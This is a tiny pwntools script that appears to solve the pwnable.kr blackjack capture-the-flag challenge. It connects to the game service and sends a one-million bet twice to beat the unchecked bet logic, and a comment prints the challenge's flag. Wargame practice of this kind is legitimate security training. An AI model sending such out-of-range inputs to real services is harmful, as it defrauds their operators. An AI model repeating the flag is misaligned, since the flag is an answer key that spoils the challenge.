from pwn import *
r = remote('pwnable.kr', 9009)
r.sendline(b'y')
r.sendline(b'1')
for _ in range(2): r.sendline(str(10 ** 6).encode())
r.interactive()
# play the game until you win and get the flag: YaY_I_AM_A_MILLIONARE_LOL

